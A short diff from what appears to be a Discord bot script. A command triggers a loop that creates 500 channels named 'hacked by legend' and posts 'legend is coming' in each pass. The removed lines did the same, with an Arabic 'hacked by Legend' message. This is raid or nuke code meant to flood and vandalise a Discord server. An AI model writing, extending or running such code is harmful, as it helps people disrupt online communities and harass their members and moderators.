@@ -126,11 +126,11 @@ client.on('message' , async (message) => {
     if (message.content.startsWith(prefix + 'x')) {
 for (let i = 0; i < 500; i++) {
 
-        message.guild.createChannel('xd', 'legend is coming')
-        message.channel.send('تم التهكير بواسكة ليجند');
+        message.guild.createChannel('hacked by legend', 'text')
+        message.channel.send('legend is coming');
 }
 }
-});   
+});  
 
 
 client.on('message', message => {
